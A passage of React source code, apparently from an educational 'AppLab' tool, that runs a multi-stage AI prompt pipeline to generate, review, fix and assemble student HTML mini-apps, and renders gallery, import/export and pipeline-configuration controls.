          if (htmlIdx > 0) cleaned = cleaned.substring(htmlIdx);
        }
        return cleaned;
      }

      // ── Hierarchical Multi-Agent Generate App ──
      // Architect breaks app into sections → each section gets Build→Review→Fix → Assembler combines
      var generateApp = useCallback(async function(userPrompt) {
        if (!callGemini || !userPrompt.trim()) return;
        setIsGenerating(true);
        setShowCode(false);
        try {
          var isElem = /k|1st|2nd|3rd|4th|5th/i.test(gradeLevel);
          var gradeCtx = 'Grade level: ' + gradeLevel + (isElem ? ' (use simple language, large buttons, bright colors)' : '');
          var pipelineLog = [];
          var enabledIds = pipelineConfig.filter(function(c) { return c.enabled; }).map(function(c) { return c.id; });
          var useArchitect = enabledIds.indexOf('architect') >= 0;
          var useReviewer = enabledIds.indexOf('reviewer') >= 0;
          var useFixer = enabledIds.indexOf('fixer') >= 0;

          // ═══ PHASE 1: ARCHITECT — decompose into sections ═══
          var sections = null;
          if (useArchitect) {
            setPipelineLive('architect');
            setGenStep('\uD83C\uDFD7\uFE0F Architect: decomposing app into sections...');
            var archPrompt = 'You are a software architect decomposing an educational mini-app into buildable sections.\n\n'
              + 'App request: "' + userPrompt.trim() + '"\n' + gradeCtx + '\n\n'
              + 'Break this app into 2-4 independent sections. Each section is a self-contained piece of the app.\n\n'
              + 'Return ONLY JSON:\n'
              + '{"appTitle":"App Title","sections":[\n'
              + '  {"id":"header","name":"Header & Navigation","desc":"What this section contains and does","css":"CSS this section needs","deps":"What other sections it depends on"},\n'
              + '  {"id":"main","name":"Main Interactive Area","desc":"...","css":"...","deps":"..."},\n'
              + '  {"id":"controls","name":"Control Panel","desc":"...","css":"...","deps":"..."}\n'
              + '],"sharedState":"Description of shared JavaScript variables/state between sections","colorScheme":"primary:#hex, accent:#hex, bg:#hex"}';
            try {
              var archResult = await callGemini(archPrompt, true);
              var archStr = (typeof archResult === 'string' ? archResult : JSON.stringify(archResult)).replace(/```json\s*/gi, '').replace(/```\s*/g, '').trim();
              var js = archStr.indexOf('{'), je = archStr.lastIndexOf('}');
              if (js >= 0 && je > js) archStr = archStr.substring(js, je + 1);
              sections = JSON.parse(archStr);
            } catch(e) { sections = null; }

            if (sections && sections.sections && sections.sections.length >= 2) {
              pipelineLog.push({ agent: 'Architect', icon: '\uD83C\uDFD7\uFE0F', result: 'Decomposed into ' + sections.sections.length + ' sections: ' + sections.sections.map(function(s) { return s.name; }).join(', '), children: sections.sections.map(function(s) { return s.name; }) });
            } else {
              // Fallback: architect failed to produce sections, use linear mode
              sections = null;
              pipelineLog.push({ agent: 'Architect', icon: '\u26A0\uFE0F', result: 'Could not decompose — falling back to single-build mode' });
            }
          }

          var finalHtml = '';

          if (sections && sections.sections && sections.sections.length >= 2) {
            // ═══ PHASE 2: PER-SECTION BUILD → REVIEW → FIX ═══
            var sectionResults = [];
            for (var si = 0; si < sections.sections.length; si++) {
              var sec = sections.sections[si];
              var secLabel = sec.name + ' (' + (si + 1) + '/' + sections.sections.length + ')';

              // BUILD this section
              setPipelineLive('builder');
              setGenStep('\uD83D\uDD28 Building: ' + secLabel);
              var secBuildPrompt = 'You are building ONE SECTION of a larger educational mini-app.\n\n'
                + 'APP: "' + userPrompt.trim() + '" — ' + (sections.appTitle || '') + '\n'
                + gradeCtx + '\nColor scheme: ' + (sections.colorScheme || 'modern, clean') + '\n\n'
                + 'THIS SECTION: ' + sec.name + '\n'
                + 'Description: ' + sec.desc + '\n'
                + 'CSS needed: ' + (sec.css || 'standard') + '\n'
                + 'Dependencies: ' + (sec.deps || 'none') + '\n'
                + 'Shared state: ' + (sections.sharedState || 'none') + '\n\n'
                + 'Generate ONLY the HTML for this section (not a full document).\n'
                + 'Use semantic tags: <section id="' + sec.id + '" aria-label="' + sec.name + '">...</section>\n'
                + 'Include inline <style> for this section\'s CSS.\n'
                + 'Include <script> for this section\'s JavaScript (if any).\n'
                + 'WCAG 2.1 AA: aria-labels, 4.5:1 contrast, keyboard nav.\n\n'
                + 'Return ONLY the section HTML. No <!DOCTYPE>, no <html>, no <body>.';
              var secHtml = await callGemini(secBuildPrompt, false);
              secHtml = (secHtml || '').replace(/^```html\s*/i, '').replace(/```\s*$/i, '').trim();
              var secLog = { agent: 'Section: ' + sec.name, icon: '\uD83D\uDCE6', result: '', children: [] };

              secLog.children.push({ agent: 'Builder', icon: '\uD83D\uDD28', result: (secHtml || '').length + ' chars' });

              // REVIEW this section
              if (useReviewer && secHtml && secHtml.length > 50) {
                setPipelineLive('reviewer');
                setGenStep('\uD83D\uDD0D Reviewing: ' + secLabel);
                var secIssues = [];
                try {
                  var sr = await callGemini('Review this HTML section for bugs, a11y gaps, and UX issues. Section: "' + sec.name + '"\n\nCODE:\n```html\n' + secHtml.substring(0, 6000) + '\n```\n\nReturn JSON array: [{"type":"error|warning|a11y","description":"...","fix":"..."}]. If perfect, return [].', true);
                  sr = (typeof sr === 'string' ? sr : JSON.stringify(sr)).replace(/```json\s*/gi, '').replace(/```\s*/g, '').trim();
                  try { secIssues = JSON.parse(sr); } catch(e2) { console.warn('[applab section-reviewer] parse failed for section "' + sec.name + '":', e2); }
                  if (!Array.isArray(secIssues)) secIssues = [];
                } catch(e3) { console.warn('[applab section-reviewer] AI call failed for section "' + sec.name + '"; skipping review:', e3); }
                secLog.children.push({ agent: 'Reviewer', icon: '\uD83D\uDD0D', result: secIssues.length === 0 ? 'Passed \u2705' : secIssues.length + ' issue(s)' });

                // FIX this section's issues
                if (useFixer && secIssues.length > 0) {
                  setPipelineLive('fixer');
                  setGenStep('\uD83D\uDD27 Fixing: ' + secLabel);
                  var secFixList = secIssues.map(function(iss, ii) { return (ii+1) + '. ' + iss.description + ' \u2192 ' + (iss.fix || ''); }).join('\n');
                  try {
                    var secFixed = await callGemini('Fix these issues in this HTML section.\n\nISSUES:\n' + secFixList + '\n\nCODE:\n```html\n' + secHtml.substring(0, 8000) + '\n```\n\nReturn ONLY the fixed section HTML.', false);
                    secFixed = (secFixed || '').replace(/^```html\s*/i, '').replace(/```\s*$/i, '').trim();
                    if (secFixed && secFixed.length > secHtml.length * 0.3) secHtml = secFixed;
                  } catch(e4) { console.warn('[applab section-fixer] AI call failed for section "' + sec.name + '"; keeping unfixed section:', e4); }
                  secLog.children.push({ agent: 'Fixer', icon: '\uD83D\uDD27', result: 'Fixed ' + secIssues.length + ' issue(s)' });
                }
              }

              secLog.result = secHtml.length + ' chars final';
              pipelineLog.push(secLog);
              sectionResults.push({ id: sec.id, name: sec.name, html: secHtml });
            }

            // ═══ PHASE 3: ASSEMBLER — combine sections into final document ═══
            setPipelineLive('assembler');
            setGenStep('\uD83E\uDDE9 Assembler: combining ' + sectionResults.length + ' sections...');
            var assemblePrompt = 'You are assembling sections into a complete HTML document.\n\n'
              + 'APP: "' + userPrompt.trim() + '"\n' + gradeCtx + '\n'
              + 'Color scheme: ' + (sections.colorScheme || 'modern') + '\n\n'
              + 'Combine these sections into ONE complete <!DOCTYPE html> document:\n\n'
              + sectionResults.map(function(sr) { return '=== SECTION: ' + sr.name + ' ===\n' + sr.html.substring(0, 5000); }).join('\n\n') + '\n\n'
              + 'REQUIREMENTS:\n'
              + '- Wrap in <!DOCTYPE html><html lang="en"><head>...</head><body><main>...</main></body></html>\n'
              + '- Consolidate all <style> blocks into one <style> in <head>\n'
              + '- Consolidate all <script> blocks into one <script> before </body>\n'
              + '- Resolve any shared state conflicts between sections\n'
              + '- Add responsive CSS, skip-to-content link, proper <title>\n'
              + '- NO external dependencies\n\n'
              + 'Return ONLY the complete HTML document.';
            finalHtml = cleanHtmlResponse(await callGemini(assemblePrompt, false));
            pipelineLog.push({ agent: 'Assembler', icon: '\uD83E\uDDE9', result: 'Combined ' + sectionResults.length + ' sections into ' + finalHtml.length + ' chars' });

          } else {
            // ═══ FALLBACK: Linear single-build (no architect or decomposition failed) ═══
            setPipelineLive('builder');
            setGenStep('\uD83D\uDD28 Building app...');
            var buildPrompt = 'You are an expert web developer building an educational mini-app.\n\n'
              + 'APP REQUEST: "' + userPrompt.trim() + '"\n' + gradeCtx + '\n\n'
              + 'REQUIREMENTS: Single HTML file, ALL CSS/JS inline, NO CDN. Interactive, WCAG 2.1 AA, responsive, educational.\n\n'
              + 'Return ONLY the complete HTML document. No markdown.';
            finalHtml = cleanHtmlResponse(await callGemini(buildPrompt, false));
            if (!finalHtml || finalHtml.length < 100) throw new Error('Builder produced empty output');
            pipelineLog.push({ agent: 'Builder', icon: '\uD83D\uDD28', result: finalHtml.length + ' chars (single-build mode)' });

            // Linear review + fix
            if (useReviewer) {
              setPipelineLive('reviewer');
              setGenStep('\uD83D\uDD0D Reviewing...');
              var issues = [];
              try {
                var rr = await callGemini('Review this HTML app for bugs/a11y/UX issues.\n\nCODE:\n```html\n' + finalHtml.substring(0, 12000) + '\n```\n\nReturn JSON array of issues. If perfect, return [].', true);
                rr = (typeof rr === 'string' ? rr : JSON.stringify(rr)).replace(/```json\s*/gi, '').replace(/```\s*/g, '').trim();
                try { issues = JSON.parse(rr); } catch(e) { console.warn('[applab linear-reviewer] JSON parse failed:', e); }
                if (!Array.isArray(issues)) issues = [];
              } catch(e) { console.warn('[applab linear-reviewer] AI call failed; skipping review:', e); }
              pipelineLog.push({ agent: 'Reviewer', icon: '\uD83D\uDD0D', result: issues.length === 0 ? 'Passed \u2705' : issues.length + ' issue(s)' });
              if (useFixer && issues.length > 0) {
                setPipelineLive('fixer');
                setGenStep('\uD83D\uDD27 Fixing ' + issues.length + ' issue(s)...');
                var fixList = issues.map(function(iss, i) { return (i+1) + '. ' + iss.description; }).join('\n');
                try {
                  var fixed = cleanHtmlResponse(await callGemini('Fix these issues:\n' + fixList + '\n\nCODE:\n```html\n' + finalHtml.substring(0, 15000) + '\n```\n\nReturn COMPLETE fixed HTML.', false));
                  if (fixed && fixed.length > finalHtml.length * 0.5) finalHtml = fixed;
                } catch(e) { console.warn('[applab linear-fixer] AI call failed; keeping unfixed HTML:', e); }
                pipelineLog.push({ agent: 'Fixer', icon: '\uD83D\uDD27', result: 'Fixed ' + issues.length + ' issue(s)' });
              }
            }
          }

          if (!finalHtml || finalHtml.length < 100) throw new Error('Pipeline produced empty output');

          setPipelineLive(null);
          setHtml(finalHtml);
          setEditHtml(finalHtml);
          setHistory(function(prev) { return prev.concat([finalHtml]); });
          setHistoryIdx(function(prev) { return prev + 1; });
          upd('appsGenerated', (d.appsGenerated || 0) + 1);
          upd('lastPipelineLog', pipelineLog);
          if (awardXP) awardXP('appLab', 15);
          var agentCount = pipelineLog.reduce(function(acc, p) { return acc + 1 + (p.children ? p.children.length : 0); }, 0);
          addToast && addToast('\u2705 ' + agentCount + '-step pipeline complete! ' + (sections ? sections.sections.length + ' sections built independently.' : 'Single-build mode.'), 'success');
        } catch(err) {
          addToast && addToast('Generation failed: ' + err.message, 'error');
        }
        setPipelineLive(null);
        setIsGenerating(false);
        setGenStep('');
      }, [callGemini, gradeLevel, addToast, awardXP, announceToSR, d, pipelineConfig]);

      // ── Enhance (iterate) ──
      var enhanceApp = useCallback(async function() {
        if (!callGemini || !enhancePrompt.trim() || !html) return;
        setIsGenerating(true);
        setGenStep('Enhancing your app...');
        try {
          var ePrompt = 'You are modifying an existing HTML mini-app. Here is the current code:\n\n'
            + '```html\n' + html.substring(0, 15000) + '\n```\n\n'
            + 'Modification requested: "' + enhancePrompt.trim() + '"\n\n'
            + 'Apply the modification and return the COMPLETE updated HTML document.\n'
            + 'Keep all existing functionality intact. Only add/change what was requested.\n'
            + 'Return ONLY the HTML — no markdown, no explanation.';
          var result = await callGemini(ePrompt, false);
          var cleaned = (result || '').replace(/^```html\s*/i, '').replace(/```\s*$/i, '').trim();
          if (!cleaned.toLowerCase().startsWith('<!doctype') && !cleaned.toLowerCase().startsWith('<html')) {
            var idx = cleaned.toLowerCase().indexOf('<!doctype');
            if (idx === -1) idx = cleaned.toLowerCase().indexOf('<html');
            if (idx > 0) cleaned = cleaned.substring(idx);
          }
          if (cleaned.length > 100) {
            setHtml(cleaned);
            setEditHtml(cleaned);
            setHistory(function(prev) { return prev.concat([cleaned]); });
            setHistoryIdx(function(prev) { return prev + 1; });
            setEnhancePrompt('');
            upd('enhanceCount', (d.enhanceCount || 0) + 1);
            if (awardXP) awardXP('appLab', 10);
            addToast && addToast('App enhanced!', 'success');
          } else {
            addToast && addToast('Enhancement failed. Try again.', 'error');
          }
        } catch(err) {
          addToast && addToast('Enhancement failed: ' + err.message, 'error');
        }
        setIsGenerating(false);
        setGenStep('');
      }, [callGemini, html, enhancePrompt, addToast, awardXP, d]);

      // ── Suggest Ideas ──
      var suggestIdeas = useCallback(async function() {
        if (!callGemini) return;
        setSugLoading(true);
        setShowSuggestions(true);
        try {
          var topic = ctx.sourceTopic || 'general science and technology';
          var sPrompt = 'Generate 6 ideas for interactive mini-apps or science demos that a ' + gradeLevel + ' student could create.\n'
            + 'Topic context: ' + topic + '\n\n'
            + 'Each idea should be a self-contained interactive web app (HTML/CSS/JS) that teaches a concept.\n'
            + 'Return ONLY a JSON array:\n'
            + '[{"title":"App Title","description":"What it does and what concept it teaches","difficulty":"Beginner|Intermediate|Advanced","prompt":"The exact prompt to generate this app"}]';
          var result = await callGemini(sPrompt, true);
          var parsed = JSON.parse((result || '').replace(/```json\s*/gi, '').replace(/```\s*/g, '').trim());
          if (Array.isArray(parsed)) setSuggestions(parsed);
        } catch(err) {
          addToast && addToast('Could not generate suggestions.', 'error');
        }
        setSugLoading(false);
      }, [callGemini, gradeLevel, ctx.sourceTopic, addToast]);

      // ── Save to Gallery ──
      var saveToGallery = useCallback(function() {
        if (!html) return;
        var title = prompt || 'Untitled App';
        // Extract title from HTML if available
        var titleMatch = html.match(/<title>([^<]+)<\/title>/i);
        if (titleMatch) title = titleMatch[1];
        var entry = { id: Date.now().toString(36), title: title, html: html, prompt: prompt, created: new Date().toISOString() };
        var updated = [entry].concat(gallery.slice(0, 19));
        setGallery(updated);
        try { localStorage.setItem(STORAGE_GALLERY, JSON.stringify(updated)); } catch(e) {}
        addToast && addToast('Saved to gallery!', 'success');
      }, [html, prompt, gallery, addToast]);

      // ── Export as HTML file ──
      var exportHtml = useCallback(function() {
        if (!html) return;
        var blob = new Blob([html], { type: 'text/html' });
        var url = URL.createObjectURL(blob);
        var a = document.createElement('a'); a.href = url; a.download = 'applab_' + Date.now() + '.html'; a.click();
        URL.revokeObjectURL(url);
        addToast && addToast('HTML file exported!', 'success');
      }, [html, addToast]);

      // ── Import HTML file ──
      var importHtml = useCallback(function(file) {
        if (!file) return;
        var reader = new FileReader();
        reader.onload = function(ev) {
          var content = ev.target.result;
          if (content && content.length > 50) {
            setHtml(content);
            setEditHtml(content);
            setHistory(function(prev) { return prev.concat([content]); });
            setHistoryIdx(function(prev) { return prev + 1; });
            setPrompt(file.name.replace(/\.html?$/i, ''));
            addToast && addToast('Imported ' + file.name + '!', 'success');
          }
        };
        reader.readAsText(file);
      }, [addToast]);

      // ── Apply code edits ──
      var applyCodeEdit = useCallback(function() {
        if (editHtml !== html) {
          setHtml(editHtml);
          setHistory(function(prev) { return prev.concat([editHtml]); });
          setHistoryIdx(function(prev) { return prev + 1; });
          upd('hasEditedCode', true);
          addToast && addToast('Code changes applied!', 'success');
        }
      }, [editHtml, html, addToast]);

      // ── Undo/Redo ──
      var canUndo = historyIdx > 0;
      var canRedo = historyIdx < history.length - 1;
      var undo = function() { if (canUndo) { var prev = history[historyIdx - 1]; setHtml(prev); setEditHtml(prev); setHistoryIdx(historyIdx - 1); } };
      var redo = function() { if (canRedo) { var next = history[historyIdx + 1]; setHtml(next); setEditHtml(next); setHistoryIdx(historyIdx + 1); } };

      // ── Styles ──
      var PURPLE = '#7c3aed';
      var btn = function(bg, fg, dis) { return { padding: '8px 16px', background: dis ? '#e5e7eb' : bg, color: dis ? '#9ca3af' : fg, border: 'none', borderRadius: '10px', fontWeight: 700, fontSize: '12px', cursor: dis ? 'not-allowed' : 'pointer', transition: 'all 0.15s' }; };
      var card = { background: '#fff', borderRadius: '14px', padding: '16px', border: '1px solid #e5e7eb', marginBottom: '12px' };

      // ═══ RENDER ═══
      return h('div', { style: { display: 'flex', flexDirection: 'column', height: '100%', gap: '12px' } },

        // ── Header / Back ──
        h('div', { style: { display: 'flex', alignItems: 'center', gap: '8px', flexShrink: 0 } },
          h('button', { onClick: function() { ctx.setStemLabTool(null); }, 'aria-label': 'Back to STEM Lab', style: btn('#f1f5f9', '#374151', false) }, h(ArrowLeft, { size: 14 })),
          h('h2', { style: { fontSize: '18px', fontWeight: 900, color: '#1e293b', margin: 0 } }, '\uD83D\uDCA1 AppLab'),
          h('span', { style: { fontSize: '11px', color: '#94a3b8' } }, 'AI Mini-App Generator'),
          html && h('div', { style: { marginLeft: 'auto', display: 'flex', gap: '4px' } },
            h('button', { onClick: undo, disabled: !canUndo, style: btn('#f1f5f9', '#374151', !canUndo), title: 'Undo' }, '↩'),
            h('button', { onClick: redo, disabled: !canRedo, style: btn('#f1f5f9', '#374151', !canRedo), title: 'Redo' }, '↪'),
            h('button', { onClick: function() { setShowCode(!showCode); }, style: btn(showCode ? PURPLE : '#f1f5f9', showCode ? '#fff' : '#374151', false), 'aria-label': 'Toggle code view' }, showCode ? '</> Hide Code' : '</> View Code'),
            h('button', { onClick: saveToGallery, style: btn('#f1f5f9', '#374151', false), title: 'Save to gallery', 'aria-label': 'Save to gallery' }, '💾'),
            h('button', { onClick: exportHtml, style: btn('#f1f5f9', '#374151', false), title: 'Export as HTML file', 'aria-label': 'Export as HTML file' }, '📥'),
            h('label', { style: Object.assign({}, btn('#f1f5f9', '#374151', false), { cursor: 'pointer', display: 'inline-flex', alignItems: 'center' }), title: 'Import HTML file', 'aria-label': 'Import HTML file' },
              '📂',
              h('input', { type: 'file', accept: '.html,.htm', style: { display: 'none' }, onChange: function(ev) { if (ev.target.files && ev.target.files[0]) importHtml(ev.target.files[0]); ev.target.value = ''; } })
            ),
            h('button', { onClick: function() { setFullscreen(!fullscreen); }, style: btn('#f1f5f9', '#374151', false), 'aria-label': 'Toggle fullscreen' }, fullscreen ? '🗗' : '⛶')
          )
        ),

        // ── No app yet: show prompt input ──
        !html && h('div', { style: { maxWidth: '700px', margin: '0 auto', width: '100%' } },

          // ── Visual Pipeline Configurator ──
          h('details', { open: showPipelineConfig, style: { marginBottom: '12px', background: 'linear-gradient(135deg, #0f172a, #1e1b4b)', borderRadius: '12px', border: '1px solid #334155', overflow: 'hidden' } },
            h('summary', { onClick: function(e) { e.preventDefault(); setShowPipelineConfig(!showPipelineConfig); },
              style: { padding: '10px 14px', color: '#c4b5fd', fontSize: '12px', fontWeight: 700, cursor: 'pointer', display: 'flex', alignItems: 'center', justifyContent: 'space-between', listStyle: 'none' } },
              h('span', null, '\u2699\uFE0F AI Pipeline Configuration'),
              h('span', { style: { fontSize: '10px', color: '#818cf8', background: 'rgba(129,140,248,0.1)', padding: '2px 8px', borderRadius: '10px' } },
                pipelineConfig.filter(function(c) { return c.enabled; }).length + '/' + PIPELINE_AGENTS.length + ' agents active')
            ),
            showPipelineConfig && h('div', { style: { padding: '12px 14px', paddingTop: 0 } },
              h('p', { style: { fontSize: '10px', color: '#94a3b8', marginBottom: '12px', lineHeight: 1.5 } },
                'Configure which AI agents run when generating an app. Toggle agents on/off and reorder them to see how it affects output quality. Each agent specializes in a different aspect of software development.'
              ),

              // Pipeline flow diagram
              h('div', { style: { display: 'flex', alignItems: 'center', gap: '4px', overflowX: 'auto', paddingBottom: '8px' },
                role: 'list', 'aria-label': 'AI agent pipeline — drag to reorder, click to toggle' },

                // Input node
                h('div', { style: { background: '#1e293b', border: '2px solid #475569', borderRadius: '10px', padding: '6px 10px', textAlign: 'center', flexShrink: 0 } },
                  h('div', { style: { fontSize: '16px' } }, '\uD83D\uDCDD'),
                  h('div', { style: { fontSize: '8px', color: '#94a3b8', fontWeight: 600 } }, 'Your Prompt')
                ),

                // Arrow
                h('div', { style: { color: '#4f46e5', fontSize: '14px', flexShrink: 0 } }, '\u2192'),

                // Agent nodes
                pipelineConfig.map(function(cfg, ci) {
                  var agent = PIPELINE_AGENTS.find(function(a) { return a.id === cfg.id; });
                  if (!agent) return null;
                  var isLive = pipelineLive === cfg.id;
                  var isOn = cfg.enabled;
                  return h(React.Fragment, { key: cfg.id },
                    h('div', { role: 'listitem', style: {
                      background: isLive ? 'rgba(129,140,248,0.2)' : isOn ? 'rgba(255,255,255,0.05)' : 'rgba(0,0,0,0.3)',
                      border: '2px solid ' + (isLive ? '#818cf8' : isOn ? agent.color + '60' : '#334155'),
                      borderRadius: '10px', padding: '8px', textAlign: 'center', minWidth: '80px', flexShrink: 0,
                      opacity: isOn ? 1 : 0.4, transition: 'all 0.2s', position: 'relative',
                      boxShadow: isLive ? '0 0 12px ' + agent.color + '40' : 'none'
                    } },
                      // Live indicator
                      isLive && h('div', { style: { position: 'absolute', top: -3, right: -3, width: 8, height: 8, background: '#22c55e', borderRadius: '50%', border: '2px solid #0f172a' } }),

                      // Reorder buttons
                      h('div', { style: { display: 'flex', justifyContent: 'center', gap: '2px', marginBottom: '4px' } },
                        ci > 0 && h('button', { onClick: function() { moveAgent(cfg.id, -1); },
                          'aria-label': 'Move ' + agent.name + ' left',
                          style: { background: 'transparent', border: 'none', color: '#94a3b8', cursor: 'pointer', fontSize: '10px', padding: '0 2px' } }, '\u25C0'),
                        ci < pipelineConfig.length - 1 && h('button', { onClick: function() { moveAgent(cfg.id, 1); },
                          'aria-label': 'Move ' + agent.name + ' right',
                          style: { background: 'transparent', border: 'none', color: '#94a3b8', cursor: 'pointer', fontSize: '10px', padding: '0 2px' } }, '\u25B6')
                      ),

                      h('div', { style: { fontSize: '18px', marginBottom: '2px' } }, agent.icon),
                      h('div', { style: { fontSize: '9px', fontWeight: 700, color: isOn ? agent.color : '#94a3b8' } }, agent.name),

                      // Toggle
                      !agent.required && h('button', {
                        onClick: function() { toggleAgent(cfg.id); },
                        'aria-label': (isOn ? 'Disable ' : 'Enable ') + agent.name,
                        style: { marginTop: '4px', padding: '2px 8px', borderRadius: '6px', border: '1px solid ' + (isOn ? '#22c55e' : '#dc2626'),
                          background: isOn ? 'rgba(34,197,94,0.1)' : 'rgba(220,38,38,0.1)',
                          color: isOn ? '#22c55e' : '#dc2626', fontSize: '8px', fontWeight: 700, cursor: 'pointer' }
                      }, isOn ? 'ON' : 'OFF'),
                      agent.required && h('div', { style: { marginTop: '4px', fontSize: '8px', color: '#94a3b8' } }, 'Required')
                    ),

                    // Arrow between agents
                    ci < pipelineConfig.length - 1 && h('div', { style: { color: '#4f46e5', fontSize: '14px', flexShrink: 0 } }, '\u2192')
                  );
                }),

                // Arrow to output
                h('div', { style: { color: '#4f46e5', fontSize: '14px', flexShrink: 0 } }, '\u2192'),

                // Output node
                h('div', { style: { background: '#1e293b', border: '2px solid #22c55e', borderRadius: '10px', padding: '6px 10px', textAlign: 'center', flexShrink: 0 } },
                  h('div', { style: { fontSize: '16px' } }, '\u2705'),
                  h('div', { style: { fontSize: '8px', color: '#22c55e', fontWeight: 600 } }, 'Your App')
                )
              ),

              // Educational description for selected agent
              h('div', { style: { marginTop: '8px' } },
                pipelineConfig.map(function(cfg) {
                  var agent = PIPELINE_AGENTS.find(function(a) { return a.id === cfg.id; });
                  if (!agent) return null;
                  return h('details', { key: cfg.id, style: { marginBottom: '4px' } },
                    h('summary', { style: { fontSize: '10px', color: agent.color, cursor: 'pointer', fontWeight: 600 } }, agent.icon + ' ' + agent.name + ': ' + agent.desc),
                    h('p', { style: { fontSize: '9px', color: '#94a3b8', padding: '4px 0 4px 16px', lineHeight: 1.5 } }, agent.learnMore)
                  );
                })
              ),

              h('div', { style: { marginTop: '8px', padding: '6px 10px', background: 'rgba(99,102,241,0.1)', borderRadius: '8px', border: '1px solid rgba(99,102,241,0.2)' } },
                h('p', { style: { fontSize: '9px', color: '#a5b4fc', lineHeight: 1.5 } },
                  '\uD83D\uDCA1 Experiment: Try disabling the Reviewer to see what happens when code isn\'t checked. Or disable the Architect to see how the Builder does without a plan. This teaches how software quality depends on process, not just skill.'
                )
              )
            )
          ),

          // Prompt input
          h('div', { style: card },
            h('label', { style: { fontSize: '13px', fontWeight: 700, color: '#374151', marginBottom: '6px', display: 'block' } }, 'What do you want to build?'),
            h('textarea', { value: prompt, onChange: function(ev) { setPrompt(ev.target.value); },
              placeholder: 'Describe an interactive app, simulation, or visualization...\n\nExamples:\n• "Interactive solar system with orbiting planets and info on click"\n• "Color mixing tool where you combine primary colors"\n• "Simple calculator with history"',
              rows: 4, style: { width: '100%', padding: '10px 14px', border: '2px solid #d1d5db', borderRadius: '12px', fontSize: '14px', fontFamily: 'inherit', resize: 'vertical', outline: 'none' },
              onFocus: function(e) { e.target.style.boxShadow = '0 0 0 3px rgba(124,58,237,0.4)'; },
              onBlur: function(e) { e.target.style.boxShadow = 'none'; },
              'aria-label': 'App description prompt' }),
            h('div', { style: { display: 'flex', gap: '8px', marginTop: '10px', flexWrap: 'wrap' } },
              h('button', { onClick: function() { generateApp(prompt); }, disabled: isGenerating || !prompt.trim(),
                'aria-busy': isGenerating,
                'aria-label': isGenerating ? ('Generating app: ' + genStep) : 'Generate app',
                style: Object.assign({}, btn(PURPLE, '#fff', isGenerating || !prompt.trim()), { padding: '10px 24px', fontSize: '14px' })
              }, isGenerating ? '\u23F3 ' + genStep : '\uD83D\uDE80 Generate App'),
              h('button', { onClick: suggestIdeas, disabled: sugLoading,
                style: btn('#f1f5f9', '#374151', sugLoading) }, sugLoading ? '\u23F3 Thinking...' : '\u2728 Suggest Ideas'),
              h('button', { onClick: function() { setShowGallery(!showGallery); },
                style: btn('#f1f5f9', '#374151', false) }, '\uD83D\uDCC2 Gallery (' + gallery.length + ')')
            )
          ),

          // Suggestions
          showSuggestions && suggestions.length > 0 && h('div', { style: card },
            h('h3', { style: { fontSize: '14px', fontWeight: 700, color: PURPLE, marginBottom: '8px' } }, '\u2728 Suggested Projects'),
            h('div', { style: { display: 'grid', gridTemplateColumns: 'repeat(auto-fill, minmax(200px, 1fr))', gap: '8px' } },
              suggestions.map(function(s, i) {
                return h('button', { key: i, onClick: function() { setPrompt(s.prompt || s.description); setShowSuggestions(false); },
                  style: { padding: '10px', borderRadius: '10px', border: '1px solid #e5e7eb', background: '#fff', cursor: 'pointer', textAlign: 'left', fontSize: '11px' }
                },
                  h('div', { style: { fontWeight: 700, color: '#1e293b', marginBottom: '2px' } }, s.title),
                  h('div', { style: { color: '#94a3b8', fontSize: '10px', lineHeight: 1.4 } }, s.description),
                  s.difficulty && h('span', { style: { fontSize: '9px', background: s.difficulty === 'Beginner' ? '#dcfce7' : s.difficulty === 'Advanced' ? '#fee2e2' : '#fef3c7', color: s.difficulty === 'Beginner' ? '#166534' : s.difficulty === 'Advanced' ? '#991b1b' : '#92400e', padding: '1px 6px', borderRadius: '6px', marginTop: '4px', display: 'inline-block' } }, s.difficulty)
                );
              })
            )
          ),

          // Templates
          h('div', { style: card },
            h('h3', { style: { fontSize: '13px', fontWeight: 700, color: '#374151', marginBottom: '8px' } }, '\uD83D\uDCCB Quick Templates'),
            h('div', { style: { display: 'flex', flexDirection: 'column', gap: '6px' } },
              TEMPLATES.map(function(cat) {
                return h('div', { key: cat.cat },
                  h('div', { style: { fontSize: '10px', fontWeight: 700, color: '#94a3b8', textTransform: 'uppercase', marginBottom: '4px' } }, cat.cat),
                  h('div', { style: { display: 'flex', gap: '4px', flexWrap: 'wrap', marginBottom: '6px' } },
                    cat.items.map(function(t) {
                      return h('button', { key: t.title, onClick: function() { setPrompt(t.prompt); },
                        style: { padding: '4px 10px', borderRadius: '8px', border: '1px solid #e5e7eb', background: '#f9fafb', cursor: 'pointer', fontSize: '11px', fontWeight: 600, color: '#374151' }
                      }, t.title);
                    })
                  )
                );
              })
            )
          ),

          // Gallery
          showGallery && gallery.length > 0 && h('div', { style: card },
            h('h3', { style: { fontSize: '14px', fontWeight: 700, color: '#374151', marginBottom: '8px' } }, '\uD83D\uDCC2 Saved Apps'),
            h('div', { style: { display: 'flex', flexDirection: 'column', gap: '6px', maxHeight: '200px', overflowY: 'auto' } },
              gallery.map(function(app) {
                return h('div', { key: app.id, style: { display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: '8px 12px', background: '#f9fafb', border: '1px solid #e5e7eb', borderRadius: '8px' } },
                  h('div', null,
                    h('div', { style: { fontWeight: 600, fontSize: '12px', color: '#1e293b' } }, app.title),
                    h('div', { style: { fontSize: '10px', color: '#9ca3af' } }, new Date(app.created).toLocaleDateString())
                  ),
                  h('div', { style: { display: 'flex', gap: '4px' } },
                    h('button', { onClick: function() { setHtml(app.html); setEditHtml(app.html); setPrompt(app.prompt || ''); setHistory([app.html]); setHistoryIdx(0); setShowGallery(false); },
                      style: btn('#f1f5f9', '#374151', false) }, 'Load'),
                    h('button', { onClick: function() {
                      var updated = gallery.filter(function(g) { return g.id !== app.id; });
                      setGallery(updated);
                      try { localStorage.setItem(STORAGE_GALLERY, JSON.stringify(updated)); } catch(e) {}
                    }, style: btn('#fee2e2', '#991b1b', false) }, '✕')
                  )
                );
              })
            )
          )
        ),

        // ── Behind the Scenes: Agent Pipeline Visualizer ──
        d.lastPipelineLog && d.lastPipelineLog.length > 0 && h('details', { style: { background: 'linear-gradient(135deg, #1e1b4b, #312e81)', borderRadius: '12px', border: '1px solid #4338ca', overflow: 'hidden' } },
          h('summary', { style: { padding: '10px 14px', color: '#c4b5fd', fontSize: '11px', fontWeight: 700, cursor: 'pointer', display: 'flex', alignItems: 'center', gap: '6px' } },
            '\uD83E\uDD16 Behind the Scenes — How AI Built This App'
          ),
          h('div', { style: { padding: '12px 14px', paddingTop: 0 } },
